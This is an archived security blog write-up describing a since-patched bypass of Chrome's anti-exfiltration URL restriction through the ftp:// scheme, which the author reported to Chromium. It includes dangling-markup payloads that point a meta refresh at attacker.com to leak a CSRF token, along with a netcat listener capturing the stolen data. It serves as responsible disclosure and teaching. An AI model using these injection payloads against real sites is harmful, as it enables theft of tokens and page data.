---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-03-07_bypassing-chromes-url-restrictions.md
original_filename: 2021-03-07_bypassing-chromes-url-restrictions.md
title: Bypassing Chrome's URL restrictions
category: documents
detected_topics:
- xss
- command-injection
- otp
- automation-abuse
- csrf
- api-security
tags:
- imported
- documents
- xss
- command-injection
- otp
- automation-abuse
- csrf
- api-security
language: en
raw_sha256: 595b6dde664e31d2b8b8b30dba3505317c26c27a071e3bb25b7777b4b2e563e8
text_sha256: 76bd658097fc83c59ff397fbfddcdadd93e3cb52c2e50e6081e56fb8b399f1c6
ingested_at: '2026-06-28T07:32:05Z'
sensitivity: unknown
redactions_applied: false
---

# Bypassing Chrome's URL restrictions

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-03-07_bypassing-chromes-url-restrictions.md
- Source Type: markdown
- Detected Topics: xss, command-injection, otp, automation-abuse, csrf, api-security
- Ingested At: 2026-06-28T07:32:05Z
- Redactions Applied: False
- Raw SHA256: `595b6dde664e31d2b8b8b30dba3505317c26c27a071e3bb25b7777b4b2e563e8`
- Text SHA256: `76bd658097fc83c59ff397fbfddcdadd93e3cb52c2e50e6081e56fb8b399f1c6`


## Content

---
title: "Bypassing Chrome's URL restrictions"
page_title: "Bypassing Chrome's URL restrictions • Jeffrey Bencteux"
url: "https://www.bencteux.fr/posts/chrome_bypass_url_restrictions/"
final_url: "https://www.bencteux.fr/posts/chrome_bypass_url_restrictions/"
authors: ["Jeffrey Bencteux (@jeffbencteux)"]
programs: ["Google (Chrome)"]
bugs: ["Browser hacking", "URL validation bypass"]
publication_date: "2021-03-07"
added_date: "2022-10-28"
source: "pentester.land/writeups.json"
original_index: 3832
---

# Bypassing Chrome's URL restrictions

__Mar 07, 2021 in[HACKING](/categories/hacking) • [WEB](/categories/web)  
__[chrome](/tags/chrome) [bypass](/tags/bypass)  
__4 min read

## Context

Studying about Content Security Policy (CSP) features, I came across a nice bypass of Chrome’s URL restrictions that the browser implements to prevent leak of HTML data. However, Chrome dropped the feature on which with the bypass rely on in its 89 version released stable a few days ago so it is no longer possible to trigger.

The idea of Chrome developpers was to prevent exfiltration of HTML content done after triggering injections vulnerabilities through restrictions on what characters can be present in an URL. Specifically if lower than ‘<’ and newline ‘\n’ are both present in an URL, the request towards it are blocked because it is considered as a malicious exfiltration.

It is typical of XSS and other type of injections such as HTML dangling markup to exfiltrate content that way so if there is no or very few legit cases in which both characters are present in an URL, it is worth implementing such defense.

Full Chrome-side discussion on the need of implementing such defense can be found [here](https://www.chromestatus.com/feature/5735596811091968) and [here](https://groups.google.com/a/chromium.org/g/blink-dev/c/KaA_YNOlTPk/m/VmmoV88xBgAJ).

## Example

Imagine a vulnerable website where injections in HTML code is possible and where an attacker decided to use [HTML dangling markup](https://lcamtuf.coredump.cx/postxss/) to exfiltrate everything after a dangling tag until a quote is encountered.

The vulnerable page would be something like:
  
  
  <!DOCTYPE html>
  <html>
  <body>
  <h1>Welcome, some_vulnerable_field !</h1>
  
  <input type="text" name="csrf-token" value="s3cr3t"/>
  
  <p>Some text in a paragraph</p>
  
  <p>More text in a paragraph, to make the exfiltrated data longer, and here is the stopping char :'( </p>
  </div>
  </body>
  </html>
  

Where `some_vulnerable_field` is the result of a non-filtered HTML form field.

The dangling tag could be of the form:
  
  
  <meta http-equiv="refresh" content='0; URL=http://attacker.com/
  

And would result in the following code:
  
  
  <!DOCTYPE html>
  <html>
  <body>
  <h1>Welcome, <meta http-equiv="refresh" content='0; URL=http://attacker.com/ !</h1>
  
  <input type="text" name="csrf-token" value="s3cr3t"/>
  
  <p>Some text in a paragraph</p>
  
  <p>More text in a paragraph, to make the exfiltrated data longer, and here is the stopping char :'( </p>
  </div>
  </body>
  </html>
  

Without the Chrome in-place restriction, when HTML would be loaded by the browser, a GET request would be issued to an attacker website as such:
  
  
  GET /%20!%3C/h1%3E%0A%0A%20%20%20%20%3Cinput%20type=%22text%22%20name=%22csrf-token%22%20value=%22s3cr3t%22/%3E%0A%0A%20%20%20%20%3Cp%3ESome%20text%20in%20a%20paragraph%3C/p%3E%0A%0A%20%20%20%20%3Cp%3EMore%20text%20in%20a%20paragraph,%20to%20make%20the%20exfiltrated%20data%20longer,%20and%20here%20is%20the%20stopping%20char%20: HTTP/1.1
  

But because the defense exists, it gets blocked with the following warning:

![Chrome warning](/img/chrome_screen1.png)

It thus prevent an attacker to exfiltrate data using that technique.

## Bypass

Trying to circumvent that restriction, a suggestion on [book.hacktricks.xyz](https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection) caught my attention.

The bypass rely on the fact that the restriction seems to be only applied to “http://” and “https://” schemes, what if you send the information on another protocol?

Chrome before 89 only natively supports few schemes. I found the following list from their github:

  * http/https
  * ftp
  * gopher
  * ws/wss (websockets)

Let’s try with FTP.

By hosting a fake FTP server with netcat and trying on a vulnerable page as such:
  
  
  <!DOCTYPE html>
  <html>
  <body>
  <h1>Welcome, <meta http-equiv="refresh" content='0; URL=ftp://attacker.com/ !</h1>
  
  <input type="text" name="csrf-token" value="s3cr3t"/>
  
  <p>Some text in a paragraph</p>
  
  <p>More text in a paragraph, to make the exfiltrated data longer, and here is the stopping char :'( </p>
  </div>
  </body>
  </html>
  

I obtained the following FTP conversation:
  
  
  $ nc -lvCp 21
  listening on [any] 21 ...
  connect to [X.X.X.X] from some.domain [Y.Y.Y.Y]
  220 ok
  USER anonymous
  331 pass
  PASS chrome@example.com
  230 ok
  SYST
  215 UNIX Type: L8
  PWD
  257 "/"
  TYPE I
  200 Switching to Binary mode
  SIZE / !</h1>  <input type="text" name="csrf-token" value="s3cr3t"/>  <p>Some text in a paragraph</p>  <p>More text in a paragraph, to make the exfiltrated data longer, and here is the stopping char :
  

So Chrome restriction did not apply here and data was exfiltrated.

It probably works with Gopher also but not tested.

As far as I know, websockets can only be initiated from javascript code so the bypass only works with an XSS. Point is, if you have an XSS, there is easier ways of bypassing that restriction, such as base64-encode the data before sending it, and so it becomes way less useful.

## Reporting

I reported the [bug](https://bugs.chromium.org/p/chromium/issues/detail?id=1171743) to Chromium’s security. They decided to drop FTP and Gopher support in version 89 and so the bypass is not working anymore because underlying feature has been killed.

## References

  * <https://www.chromestatus.com/feature/5735596811091968>
  * <https://groups.google.com/a/chromium.org/g/blink-dev/c/KaA_YNOlTPk/m/VmmoV88xBgAJ>
  * [https://lcamtuf.coredump.cx/postxss](https://lcamtuf.coredump.cx/postxss/)
  * <https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection>
  * <https://bugs.chromium.org/p/chromium/issues/detail?id=1171743>

[ __ Finding an infosec job in Italy ](/posts/an_infosec_job_in_italy/) [ Elearnsecurity Junior Penetration Tester (eJPT) review __](/posts/ejpt/)
